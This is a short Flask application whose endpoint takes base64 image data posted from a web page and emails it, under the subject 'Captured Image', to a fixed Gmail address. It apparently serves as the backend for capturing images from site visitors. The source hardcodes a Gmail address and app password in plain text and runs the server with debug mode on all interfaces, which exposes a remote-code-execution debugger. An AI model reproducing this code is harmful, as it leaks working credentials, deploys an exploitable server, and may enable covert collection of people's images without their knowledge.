from flask import Flask, request, jsonify, render_template
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import base64

app = Flask(__name__)

# Email configuration (replace with your details)
EMAIL_ADDRESS = "notorioushehe@gmail.com"
EMAIL_PASSWORD = "dcrk zgpo mcrj wfeb"  # Use your App Password
RECIPIENT_EMAIL = "tneerajvenkatasai@gmail.com"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-image', methods=['POST'])
def send_image():
    data = request.get_json()
    image_data = data.get('image')

    try:
        image_bytes = base64.b64decode(image_data.split(',')[1])
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid image data'}), 400

    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = 'Captured Image'

    image = MIMEImage(image_bytes, name='user-image.png')
    msg.attach(image)

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(f"Error sending email: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)